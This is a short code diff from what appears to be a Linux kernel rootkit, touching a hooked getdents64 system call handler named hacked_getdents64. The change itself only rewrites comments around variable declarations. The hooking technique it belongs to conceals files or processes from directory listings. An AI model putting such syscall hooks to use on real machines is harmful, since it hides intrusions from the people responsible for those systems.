@@ -139,11 +139,14 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 	// Storing file descriptor
 	int fd = (int) pt_regs->di;
 
-	// Storing the name of the directory passed from user space via "si" register
+	/* User space related variable
+         * Storing the name of the directory passed from user space via "si" register
+         */
 	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
 
 	int ret = orig_getdents64(pt_regs), err;
 
+	// kernel space related variables
 	unsigned short proc = 0;
 	unsigned long offset = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
